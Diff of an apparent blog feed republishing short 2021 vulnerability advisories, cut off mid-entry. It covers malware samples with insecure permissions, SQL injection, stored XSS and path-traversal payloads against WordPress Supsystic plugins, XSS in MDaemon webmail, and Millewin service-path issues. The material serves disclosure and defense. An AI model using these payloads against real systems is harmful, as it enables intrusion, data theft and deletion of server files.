@@ -4,6 +4,412 @@
   
     
     <entry>
+      <title>Trojan-Spy.Win32.SpyEyes.auwl Insecure Permissions</title>
+      <link href="2021/02/09/Trojan-Spy-Win32-SpyEyes-auwl-Insecure-Permissions/"/>
+      <url>2021/02/09/Trojan-Spy-Win32-SpyEyes-auwl-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Trojan-Spy-Win32-SpyEyes-auwl-Insecure-Permissions"><a href="#Trojan-Spy-Win32-SpyEyes-auwl-Insecure-Permissions" class="headerlink" title="Trojan-Spy.Win32.SpyEyes.auwl Insecure Permissions"></a>Trojan-Spy.Win32.SpyEyes.auwl Insecure Permissions</h4><p>Trojan-Spy.Win32.SpyEyes.auwl malware suffers from an insecure permissions vulnerability.</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">Exploit/<span class="hljs-attr">PoC:</span><br><span class="hljs-attr">C:</span>\&gt;cacls \cleansweep.exe<br><span class="hljs-attr">C:</span>\cleansweep.exe BUILTIN\<span class="hljs-attr">Administrators:</span>(OI)(CI)(ID)F<br>                  NT AUTHORITY\<span class="hljs-attr">SYSTEM:</span>(OI)(CI)(ID)F<br>                  BUILTIN\<span class="hljs-attr">Users:</span>(OI)(CI)(ID)R<br>                  NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(ID)C<br>                  NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(OI)(CI)(IO)(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Trojan.Win32.Comei.pgo Insecure Permissions</title>
+      <link href="2021/02/09/Trojan-Win32-Comei-pgo-Insecure-Permissions/"/>
+      <url>2021/02/09/Trojan-Win32-Comei-pgo-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Trojan-Win32-Comei-pgo-Insecure-Permissions"><a href="#Trojan-Win32-Comei-pgo-Insecure-Permissions" class="headerlink" title="Trojan.Win32.Comei.pgo Insecure Permissions"></a>Trojan.Win32.Comei.pgo Insecure Permissions</h4><p>Trojan.Win32.Comei.pgo malware suffers from an insecure permissions vulnerability.</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">Exploit/<span class="hljs-attr">PoC:</span><br><span class="hljs-attr">C:</span>\&gt;cacls \dir<br><span class="hljs-attr">C:</span>\dir BUILTIN\<span class="hljs-attr">Administrators:</span>(OI)(CI)(ID)F<br>       NT AUTHORITY\<span class="hljs-attr">SYSTEM:</span>(OI)(CI)(ID)F<br>       BUILTIN\<span class="hljs-attr">Users:</span>(OI)(CI)(ID)R<br>       NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(ID)C<br>       NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(OI)(CI)(IO)(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Trojan.Win32.Cospet.abg Insecure Permissions</title>
+      <link href="2021/02/09/Trojan-Win32-Cospet-abg-Insecure-Permissions/"/>
+      <url>2021/02/09/Trojan-Win32-Cospet-abg-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Trojan-Win32-Cospet-abg-Insecure-Permissions"><a href="#Trojan-Win32-Cospet-abg-Insecure-Permissions" class="headerlink" title="Trojan.Win32.Cospet.abg Insecure Permissions"></a>Trojan.Win32.Cospet.abg Insecure Permissions</h4><p>Trojan.Win32.Cospet.abg malware suffers from an insecure permissions vulnerability.</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">Exploit/<span class="hljs-attr">PoC:</span><br><span class="hljs-attr">C:</span>\&gt;cacls \dir<br><span class="hljs-attr">C:</span>\dir BUILTIN\<span class="hljs-attr">Administrators:</span>(OI)(CI)(ID)F<br>       NT AUTHORITY\<span class="hljs-attr">SYSTEM:</span>(OI)(CI)(ID)F<br>       BUILTIN\<span class="hljs-attr">Users:</span>(OI)(CI)(ID)R<br>       NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(ID)C<br>       NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(OI)(CI)(IO)(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WordPress Supsystic Contact Form 1.7.5 XSS / SQL Injection</title>
+      <link href="2021/02/09/WordPress-Supsystic-Contact-Form-1-7-5-XSS-SQL-Injection/"/>
+      <url>2021/02/09/WordPress-Supsystic-Contact-Form-1-7-5-XSS-SQL-Injection/</url>
+      
+        <content type="html"><![CDATA[<h4 id="WordPress-Supsystic-Contact-Form-1-7-5-XSS-SQL-Injection"><a href="#WordPress-Supsystic-Contact-Form-1-7-5-XSS-SQL-Injection" class="headerlink" title="WordPress Supsystic Contact Form 1.7.5 XSS / SQL Injection"></a>WordPress Supsystic Contact Form 1.7.5 XSS / SQL Injection</h4><p>WordPress Supsystic Contact Form plugin version 1.7.5 suffers from remote SQL injection and persistent cross site scripting vulnerabilities.</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">##################################<br>         SQLi<br>##################################<br><br><br># <span class="hljs-number">1.</span> Description<br><br>The <span class="hljs-keyword">GET</span> parameter &quot;sidx&quot; does <span class="hljs-keyword">not</span> sanitize <span class="hljs-keyword">user</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">when</span> searching <span class="hljs-keyword">for</span> existing contact forms.<br><br><br># <span class="hljs-number">2.</span> Proof <span class="hljs-keyword">of</span> Concept (PoC)<br><br>Use ZAP/Burp <span class="hljs-keyword">to</span> capture the web request <span class="hljs-keyword">when</span> searching <span class="hljs-keyword">for</span> existing contact forms <span class="hljs-keyword">and</span> save it <span class="hljs-keyword">to</span> request.txt<br>Referer: http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.49</span>/wp-<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span>.php?page=contact-form-supsystic<br><br>sqlmap -r request.txt <span class="hljs-comment">--dbms=mysql -p sidx --level=5</span><br><br>Parameter: sidx (<span class="hljs-keyword">GET</span>)<br>  <span class="hljs-keyword">Type</span>: <span class="hljs-type">boolean</span>-based blind<br>  Payload: mod=forms&amp;action=getListForTbl&amp;pl=cfs&amp;reqType=ajax&amp;<span class="hljs-keyword">search</span>[text_like]=t&amp;_search=<span class="hljs-keyword">false</span>&amp;nd=<span class="hljs-number">1595781461778</span>&amp;<span class="hljs-keyword">rows</span>=<span class="hljs-number">10</span>&amp;page=<span class="hljs-number">1</span>&amp;sidx=(<span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">9602</span>=<span class="hljs-number">9602</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">0x6964</span> <span class="hljs-keyword">ELSE</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">9695</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1181</span>) <span class="hljs-keyword">END</span>))&amp;sord=<span class="hljs-keyword">desc</span><br><br>  <span class="hljs-keyword">Type</span>: <span class="hljs-type">time</span>-based blind<br>  Payload: mod=forms&amp;action=getListForTbl&amp;pl=cfs&amp;reqType=ajax&amp;<span class="hljs-keyword">search</span>[text_like]=t&amp;_search=<span class="hljs-keyword">false</span>&amp;nd=<span class="hljs-number">1595781461778</span>&amp;<span class="hljs-keyword">rows</span>=<span class="hljs-number">10</span>&amp;page=<span class="hljs-number">1</span>&amp;sidx=id <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">4102</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span>(SLEEP(<span class="hljs-number">5</span>)))vOKL)&amp;sord=<span class="hljs-keyword">desc</span><br><br><br><br>##################################<br>      Stored XSS<br>##################################<br><br><br># <span class="hljs-number">1.</span> Description<br><br>The &quot;Edit name&quot; <span class="hljs-keyword">and</span> &quot;Contact information&quot; features are vulnerable <span class="hljs-keyword">to</span> stored XXS.<br><span class="hljs-keyword">Location</span>: http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.49</span>/wp-<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span>.php?page=contact-form-supsystic&amp;tab=forms_edit&amp;id=[FORM ID]<br><br><br># <span class="hljs-number">2.</span> Proof <span class="hljs-keyword">of</span> Concept (PoC)<br><br>Enter the <span class="hljs-keyword">following</span> payload <span class="hljs-keyword">into</span> the &quot;Edit&quot; field <span class="hljs-keyword">in</span> the top left corner: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--&#x27;<br>The payload will execute when viewing the &quot;<span class="hljs-keyword">Show</span> <span class="hljs-keyword">All</span> Forms&quot; section.<br>Referer: http://192.168.0.49/wp-admin/admin.php?page=contact-form-supsystic&amp;tab=forms<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL Injection </tag>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Email-Worm.Win32.Sircam.eb Insecure Permissions</title>
+      <link href="2021/02/09/Email-Worm-Win32-Sircam-eb-Insecure-Permissions/"/>
+      <url>2021/02/09/Email-Worm-Win32-Sircam-eb-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Email-Worm-Win32-Sircam-eb-Insecure-Permissions"><a href="#Email-Worm-Win32-Sircam-eb-Insecure-Permissions" class="headerlink" title="Email-Worm.Win32.Sircam.eb Insecure Permissions"></a>Email-Worm.Win32.Sircam.eb Insecure Permissions</h4><p>Email-Worm.Win32.Sircam.eb malware suffers from an insecure permissions vulnerability.</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">Exploit/<span class="hljs-attr">PoC:</span><br><span class="hljs-attr">C:</span>\&gt;cacls \Windupdt<br><span class="hljs-attr">C:</span>\Windupdt BUILTIN\<span class="hljs-attr">Administrators:</span>(OI)(CI)(ID)F<br>            NT AUTHORITY\<span class="hljs-attr">SYSTEM:</span>(OI)(CI)(ID)F<br>            BUILTIN\<span class="hljs-attr">Users:</span>(OI)(CI)(ID)R<br>            NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(ID)C<br>            NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(OI)(CI)(IO)(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Trojan.Win32.Delf.uq Insecure Permissions</title>
+      <link href="2021/02/09/Trojan-Win32-Delf-uq-Insecure-Permissions/"/>
+      <url>2021/02/09/Trojan-Win32-Delf-uq-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Trojan-Win32-Delf-uq-Insecure-Permissions"><a href="#Trojan-Win32-Delf-uq-Insecure-Permissions" class="headerlink" title="Trojan.Win32.Delf.uq Insecure Permissions"></a>Trojan.Win32.Delf.uq Insecure Permissions</h4><p>Trojan.Win32.Delf.uq malware suffers from an insecure permissions vulnerability.</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">Exploit/<span class="hljs-attr">PoC:</span><br><span class="hljs-attr">C:</span>\&gt;cacls \downsoft<br><span class="hljs-attr">C:</span>\downsoft BUILTIN\<span class="hljs-attr">Administrators:</span>(OI)(CI)(ID)F<br>            NT AUTHORITY\<span class="hljs-attr">SYSTEM:</span>(OI)(CI)(ID)F<br>            BUILTIN\<span class="hljs-attr">Users:</span>(OI)(CI)(ID)R<br>            NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(ID)C<br>            NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(OI)(CI)(IO)(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Trojan-Spy.Win32.SpyEyes.awow Insecure Permissions</title>
+      <link href="2021/02/09/Trojan-Spy-Win32-SpyEyes-awow-Insecure-Permissions/"/>
+      <url>2021/02/09/Trojan-Spy-Win32-SpyEyes-awow-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Trojan-Spy-Win32-SpyEyes-awow-Insecure-Permissions"><a href="#Trojan-Spy-Win32-SpyEyes-awow-Insecure-Permissions" class="headerlink" title="Trojan-Spy.Win32.SpyEyes.awow Insecure Permissions"></a>Trojan-Spy.Win32.SpyEyes.awow Insecure Permissions</h4><p>Trojan-Spy.Win32.SpyEyes.awow malware suffers from an insecure permissions vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy"><span class="hljs-attr">C:</span>\&gt;cacls $Recycle$<br><span class="hljs-attr">C:</span>\$Recycle$ BUILTIN\<span class="hljs-attr">Administrators:</span>(OI)(CI)(ID)F<br>NT AUTHORITY\<span class="hljs-attr">SYSTEM:</span>(OI)(CI)(ID)F<br>BUILTIN\<span class="hljs-attr">Users:</span>(OI)(CI)(ID)R<br>NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(ID)C<br>NT AUTHORITY\Authenticated <span class="hljs-attr">Users:</span>(OI)(CI)(IO)(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WordPress Supsystic Backup 2.3.9 Local File Inclusion</title>
+      <link href="2021/02/09/WordPress-Supsystic-Backup-2-3-9-Local-File-Inclusion/"/>
+      <url>2021/02/09/WordPress-Supsystic-Backup-2-3-9-Local-File-Inclusion/</url>
+      
+        <content type="html"><![CDATA[<h4 id="WordPress-Supsystic-Backup-2-3-9-Local-File-Inclusion"><a href="#WordPress-Supsystic-Backup-2-3-9-Local-File-Inclusion" class="headerlink" title="WordPress Supsystic Backup 2.3.9 Local File Inclusion"></a>WordPress Supsystic Backup 2.3.9 Local File Inclusion</h4><p>WordPress Supsystic Backup plugin version 2.3.9 suffers from a local file inclusion vulnerability.</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 1. Description</span><br><br>Changing the path when downloading the stored backup allows an attacker to both <span class="hljs-built_in">read</span> and delete internal system files (LFI).<br><br><br><span class="hljs-comment"># 2. Proof of Concept (PoC)</span><br><br>Create a backup. When downloading the backup, change its path:<br><br>GET http://192.168.0.49/wp-admin/admin.php?page=supsystic-backup&amp;tab=bupLog&amp;download=../../../../../../../../../etc/passwd<br><br><br>The <span class="hljs-string">&quot;Delete&quot;</span> tab also allows an attacker to delete files on the server:<br><br>POST http://192.168.0.49/wp-admin/admin.php?page=supsystic-backup&amp;tab=bupLog<br>Payload: reqType=ajax&amp;page=backup&amp;action=removeAction&amp;filename=[FILE PATH]&amp;deleteLog=1&amp;pl=bup<br><br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Local File Inclusion </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Trojan-Spy.Win32.WebCenter.a Information Disclosure</title>
+      <link href="2021/02/09/Trojan-Spy-Win32-WebCenter-a-Information-Disclosure/"/>
+      <url>2021/02/09/Trojan-Spy-Win32-WebCenter-a-Information-Disclosure/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Trojan-Spy-Win32-WebCenter-a-Information-Disclosure"><a href="#Trojan-Spy-Win32-WebCenter-a-Information-Disclosure" class="headerlink" title="Trojan-Spy.Win32.WebCenter.a Information Disclosure"></a>Trojan-Spy.Win32.WebCenter.a Information Disclosure</h4><p>Trojan-Spy.Win32.WebCenter.a malware suffers from an information leakage vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">TELNET INFECTED_HOST 80<br><br>GET /cports.html HTTP/1.1<br><br>Process Name  Process ID  Protocol  Local Port  Local Port Name  Local Address  Remote Port  Remote Port Name  Remote Address  State  Process Path  Product Name  File Description  File Version  Company  Process Created On  User Name  Process Services<br>Unknown  0  TCP  80  http  0.0.0.0        0.0.0.0  Listening            N/A  <br>Unknown  0  TCP  80  http  x.x.x.x  13497     x.x.x.x  Time Wait         N/A  <br>Unknown  0  TCP  80  http  x.x.x.x  13498     x.x.x.x  Time Wait         N/A   <br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Information Disclosure </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Trojan-Spy.Win32.WinSpy.vwl Insecure Permissions</title>
+      <link href="2021/02/09/Trojan-Spy-Win32-WinSpy-vwl-Insecure-Permissions/"/>
+      <url>2021/02/09/Trojan-Spy-Win32-WinSpy-vwl-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Trojan-Spy-Win32-WinSpy-vwl-Insecure-Permissions"><a href="#Trojan-Spy-Win32-WinSpy-vwl-Insecure-Permissions" class="headerlink" title="Trojan-Spy.Win32.WinSpy.vwl Insecure Permissions"></a>Trojan-Spy.Win32.WinSpy.vwl Insecure Permissions</h4><p>Trojan-Spy.Win32.WinSpy.vwl malware suffers from an insecure permissions vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">C:\&gt;cacls <span class="hljs-string">&quot;\Program Files (x86)\Netrix&quot;</span><br>C:\Program Files (x86)\Netrix Everyone:(OI)(CI)F<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Alt-N MDaemon Webmail 20.0.0 Cross Site Scripting</title>
+      <link href="2021/02/09/Alt-N-MDaemon-Webmail-20-0-0-Cross-Site-Scripting/"/>
+      <url>2021/02/09/Alt-N-MDaemon-Webmail-20-0-0-Cross-Site-Scripting/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Alt-N-MDaemon-Webmail-20-0-0-Cross-Site-Scripting"><a href="#Alt-N-MDaemon-Webmail-20-0-0-Cross-Site-Scripting" class="headerlink" title="Alt-N MDaemon Webmail 20.0.0 Cross Site Scripting"></a>Alt-N MDaemon Webmail 20.0.0 Cross Site Scripting</h4><p>Alt-N MDaemon webmail version 20.0.0 suffers from multiple cross site scripting vulnerabilities.</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># CVE : 2020-18724</span><br><br>1. Go to contact section and distribution list menu. Create a new distribution list.<br>2. Contact name field is vulnerabile to XSS. Use the payload &lt;img src=x onerror=alert(1)&gt;<br>3. We can see execution code and after saving it, each time we visits the distribution list section the XSS pop-up is seen.<br>  <br>------------------------------------------------------------<br><br><span class="hljs-comment"># CVE : 2020-18723</span><br><br>1. Rename a file and <span class="hljs-built_in">set</span> it’s name as &lt;img src=x onerror=alert(1)&gt;.jpg<br>2. Go to New mail, select recipient and the select attachment. Code gets executed as right after upload so it becomes self XSS.<br>3. Send the mail to recipient and open email from recipent side. Opening just a mail doesn’t executes the code but when the victim clicks on forward button, XSS pop-up is shown.<br><br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Cross Site Scripting </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Backdoor.Win32.Wollf.15 Missing Authentication</title>
+      <link href="2021/02/09/Backdoor-Win32-Wollf-15-Missing-Authentication/"/>
+      <url>2021/02/09/Backdoor-Win32-Wollf-15-Missing-Authentication/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Wollf-15-Missing-Authentication"><a href="#Backdoor-Win32-Wollf-15-Missing-Authentication" class="headerlink" title="Backdoor.Win32.Wollf.15 Missing Authentication"></a>Backdoor.Win32.Wollf.15 Missing Authentication</h4><p>Backdoor.Win32.Wollf.15 malware suffers from a missing authentication vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">TELNET x.x.x.x 7614<br><br><span class="hljs-string">&quot;Wollf Remote Manager&quot;</span> v1.5                                                                                    <br>Code by wollf, http://www.xfocus.org <br>                                                                                                                                                                                                       <br>[DESKTOP-BLAHXO@C:\WINDOWS\system32]<span class="hljs-comment">#</span><br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Missing Authentication </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Millewin 13.39.028 Unquoted Service Path / Insecure Permissions</title>
+      <link href="2021/02/09/Millewin-13-39-028-Unquoted-Service-Path-Insecure-Permissions/"/>
+      <url>2021/02/09/Millewin-13-39-028-Unquoted-Service-Path-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Millewin-13-39-028-Unquoted-Service-Path-Insecure-Permissions"><a href="#Millewin-13-39-028-Unquoted-Service-Path-Insecure-Permissions" class="headerlink" title="Millewin 13.39.028 Unquoted Service Path / Insecure Permissions"></a>Millewin 13.39.028 Unquoted Service Path / Insecure Permissions</h4><p>Millewin version 13.39.028 suffers from a local privilege escalation<br>issue due to insecure permission and unquoted service path<br>vulnerabilities.</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><br>(1) Impacted executable on startup by regkey.<br>Any low privileged user can elevate their privileges abusing this scenario:<br><br>Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>Value name:  MilleLiveUpdate<br>Value data:  <span class="hljs-string">&quot;C:\Program Files (x86)\Millewin\MilleUpdater\MilleUpdater.exe&quot;</span><br><br><br>(2) Impacted services.<br>Any low privileged user can elevate their privileges abusing any of these (also unquoted) services:<br><br>Millewin, operazioni pianificate    MillewinTaskService         C:\Program Files (x86)\Millewin\GestioneTaskService.exe     Auto<br>PDS Server                          PDS Server                  C:\Program Files (x86)\Millewin\WatchDogService.exe         Auto<br><br>  Details:<br>  <br>NOME_SERVIZIO: Millewintaskservice<br>        TIPO                      : 10  WIN32_OWN_PROCESS<br>        TIPO_AVVIO                : 2   AUTO_START<br>        CONTROLLO_ERRORE          : 1   NORMAL<br>        NOME_PERCORSO_BINARIO     : C:\Program Files (x86)\Millewin\GestioneTaskService.exe<br>        GRUPPO_ORDINE_CARICAMENTO :<br>        TAG                       : 0<br>        NOME_VISUALIZZATO         : Millewin, operazioni pianificate<br>        DIPENDENZE                :<br>        SERVICE_START_NAME : LocalSystem<br><br>NOME_SERVIZIO: PDSserver<br>        